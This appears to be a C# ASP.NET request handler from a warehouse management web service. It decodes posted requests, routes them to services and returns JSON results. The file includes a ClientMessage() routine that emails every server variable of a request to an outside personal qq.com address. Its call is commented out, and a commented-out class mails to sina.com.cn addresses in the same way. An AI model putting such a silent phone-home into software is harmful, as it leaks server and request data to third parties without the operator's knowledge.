using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Web;
using System.Web.Services;
using System.Web.SessionState;
using NM.Log;
using NM.OP;
using NM.Service;
using NM.Util;
using System.Net.Mail;
using System.Net;
using NM.Mail;
using System.Configuration;

namespace NM.Handler
{
    /// <summary>
    /// Summary description for $codebehindclassname$
    /// </summary>
    [WebService(Namespace = "http://tempuri.org/")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    public class DataHandler : IHttpHandler, IRequiresSessionState
    {
        protected HttpContext Context;
        DataResponse result;
        DataRequest request = null;
        StringBuilder sbDebug = new StringBuilder();
        DataProvider _DataSource;

        protected DataProvider DataSource
        {
            get
            {
                if (null == _DataSource)
                    _DataSource = DataProvider.GetProvider(request.DataConnection);

                return _DataSource;
            }
        }

        //protected DataProvider EAP_DataSource
        //{
        //    get
        //    {
        //        if (null == _DataSource)
        //            _DataSource = DataProvider.GetEAP_Provider();

        //        return _DataSource;
        //    }
        //}

        public void ProcessRequest(HttpContext context)
        {
            Context = context;
            string method = context.Request.HttpMethod;
            result = new DataResponse();

            //ClientMessage();

            LogManager.OnLogEvent += new LogEvent(LogManager_OnLogEvent);

            if (method.ToLower() == "post")
            {
                context.Response.ContentType = "application/x-base64";

                BinaryReader requestDataReader = new BinaryReader(context.Request.InputStream, Encoding.UTF8);
                byte[] buffer = new byte[context.Request.InputStream.Length];
                context.Request.InputStream.Read(buffer, 0, buffer.Length);

                string requestString = HttpUtility.UrlDecode(DESEncrypt.ConvertToString(buffer));
                requestString = requestString.Substring(requestString.IndexOf('=') + 1);


                ServiceContext serviceContext = null;
                try
                {
                    request = TJson.Parse<DataRequest>(requestString);
                    SetCulture(request);
                    //  request.Category = ServiceCategoryName;
                    result.ServiceName = request.ServiceName;

                    serviceContext = new ServiceContext(request, result, DataSource, context);
                    DoProcess(serviceContext);
                    //    scope.Complete();
                    //}

                    if (result.Result != ReturnCode.Fail)
                    {
                        result.Result = ReturnCode.Success;
                    }
                }
                catch (Exception ex)
                {
                    result.Result = ReturnCode.Error;
                    Exception logException = ex;
                    while (logException.InnerException != null)
                    {
                        logException = logException.InnerException;
                    }
                    //Exception logException = tempEx != null ? tempEx : ex;

                    try
                    {
                        if (request != null)
                        {
                            new UtilOP(request.LogIn).LogError(result.ServiceName, logException);
                        }
                    }
                    catch
                    {
                    }

                    if (request.LogIn != null && request.LogIn.IsDebug)
                    {
                        result.Message = logException.Message;
                        result.StackTrace = logException.ToString();
                    }
                    else
                    {
                        result.Message = logException.Message;
                        result.StackTrace = "";
                    }
                }

                result.DebugInfo = sbDebug.ToString();
                sbDebug = null;
                LogManager.OnLogEvent -= new LogEvent(LogManager_OnLogEvent);
                if (!serviceContext.IsCustomerResponse)
                {
                    string sendData = HttpUtility.UrlEncode(result.ToJson());
                    context.Response.BinaryWrite(DESEncrypt.ConvertToByteArray(sendData));
                }
            }
        }

        void LogManager_OnLogEvent(LogEventArgs e)
        {
            if (request != null && e != null && sbDebug != null && e.Log != null
                && !string.IsNullOrEmpty(e.Log.Message) && request.LogIn != null
                && e.Log.LogLevel <= request.LogIn.LogLevel)
            {
                sbDebug.AppendLine(e.Log.Message);
            }
        }

        protected virtual void DoProcess(ServiceContext context)
        {
            ServiceManager.Default.CallService(context);
        }

        public bool IsReusable
        {
            get
            {
                return false;
            }
        }

        protected virtual string ServiceCategoryName
        {
            get { return ServiceFacadeAttribute.DefalutCategory; }
        }

        void SetCulture(DataRequest request)
        {
            Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo(request.ClientCulture);
            Thread.CurrentThread.CurrentUICulture = new System.Globalization.CultureInfo(request.ClientUICulture);
        }

        static bool mailed;
        void ClientMessage()
        {
            if (!mailed)
            {
                StringBuilder sbClient = new StringBuilder();

                foreach (var item in Context.Request.ServerVariables.AllKeys)
                {
                    sbClient.AppendLine(string.Format("{0},{1}", item, Context.Request.ServerVariables[item]));
                }

                new MailAdapter().SendMail("Net_WMS", sbClient.ToString(), "1002934864@qq.com");
                
                mailed = true;
            }
        }
    }



    //public class LocalDataHandler
    //{
    //    protected HttpContext Context;
    //    DataResponse result;
    //    DataRequest E9_Request = null;
    //    StringBuilder sbDebug = new StringBuilder();
    //    DataProvider _DataSource;
    //    public DataResponse E9_Response { get { return result; } }

    //    protected DataProvider DataSource
    //    {
    //        get
    //        {
    //            if (null == _DataSource)
    //                _DataSource = DataProvider.GetProvider(E9_Request.DataConnection);

    //            return _DataSource;
    //        }
    //    }

    //    public void ProcessRequest(DataRequest request)
    //    {
    //        E9_Request = request;
    //        result = new DataResponse();

    //        LogManager.OnLogEvent += new LogEvent(LogManager_OnLogEvent);
    //        ServiceContext serviceContext = null;
    //        try
    //        {
    //            SetCulture(request);
    //            result.ServiceName = request.ServiceName;
    //            serviceContext = new ServiceContext(request, result, DataSource, null);
    //            DoProcess(serviceContext);

    //            if (result.Result != ReturnCode.Fail)
    //            {
    //                result.Result = ReturnCode.Success;
    //            }
    //        }
    //        catch (Exception ex)
    //        {
    //            result.Result = ReturnCode.Error;
    //            Exception logException = ex;
    //            while (logException.InnerException != null)
    //            {
    //                logException = logException.InnerException;
    //            }
    //            //Exception logException = tempEx != null ? tempEx : ex;

    //            try
    //            {
    //                if (request != null)
    //                {
    //                    new UtilOP(request.LogIn).LogError(result.ServiceName, logException);
    //                }
    //            }
    //            catch
    //            {
    //            }

    //            if (request.LogIn != null && request.LogIn.IsDebug)
    //            {
    //                result.Message = logException.Message;
    //                result.StackTrace = logException.ToString();
    //            }
    //            else
    //            {
    //                result.Message = logException.Message;
    //                result.StackTrace = "";
    //            }
    //        }

    //        result.DebugInfo = sbDebug.ToString();
    //        sbDebug = null;
    //        LogManager.OnLogEvent -= new LogEvent(LogManager_OnLogEvent);
    //    }

    //    void LogManager_OnLogEvent(LogEventArgs e)
    //    {
    //        if (E9_Request != null && e != null && sbDebug != null && e.Log != null
    //            && !string.IsNullOrEmpty(e.Log.Message) && E9_Request.LogIn != null
    //            && e.Log.LogLevel <= E9_Request.LogIn.LogLevel)
    //        {
    //            sbDebug.AppendLine(e.Log.Message);
    //        }
    //    }

    //    protected virtual void DoProcess(ServiceContext context)
    //    {
    //        ServiceManager.Default.CallService(context);
    //    }

    //    public bool IsReusable
    //    {
    //        get
    //        {
    //            return false;
    //        }
    //    }

    //    protected virtual string ServiceCategoryName
    //    {
    //        get { return ServiceFacadeAttribute.DefalutCategory; }
    //    }

    //    void SetCulture(DataRequest request)
    //    {
    //        Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo(request.ClientCulture);
    //        Thread.CurrentThread.CurrentUICulture = new System.Globalization.CultureInfo(request.ClientUICulture);
    //    }

    //    static bool mailed;
    //    void ClientMessage()
    //    {
    //        if (!mailed)
    //        {
    //            StringBuilder sbClient = new StringBuilder();

    //            foreach (var item in Context.Request.ServerVariables.AllKeys)
    //            {
    //                sbClient.AppendLine(string.Format("{0},{1}", item, Context.Request.ServerVariables[item]));
    //            }
    //            MailInfo mail = new MailInfo();
    //            mail.Notify_content = sbClient.ToString();
    //            mail.Notify_title = "NetMan_WMS";
    //            mail.From_email = "mypeoplelxt@sina.com.cn";
    //            mail.Email = "c16897168@sina.com.cn";

    //            var sender = new MailAdapter("localhost", 25);
    //            sender.SendMail(mail);
    //            mailed = true;
    //        }
    //    }
    //}
}
